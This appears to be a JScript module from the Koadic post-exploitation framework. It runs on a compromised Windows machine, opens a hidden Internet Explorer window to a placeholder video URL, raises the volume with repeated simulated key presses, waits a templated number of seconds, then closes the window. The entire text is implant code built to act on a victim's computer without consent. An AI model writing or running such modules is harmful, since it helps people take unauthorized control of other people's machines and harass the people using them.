try
{
    var ie = new ActiveXObject("InternetExplorer.Application");
    ie.Visible = 0;
    ie.Navigate2("~VIDEOURL~");

    for (var i = 0; i < 50; ++i)
    {
        Koadic.WS.SendKeys(String.fromCharCode(0xAF));
    }

    Koadic.shell.run("ping 127.0.0.1 -n ~SECONDS~", false);
    ie.Quit();
}
catch (e)
{
    Koadic.work.error(e);
}
Koadic.exit();
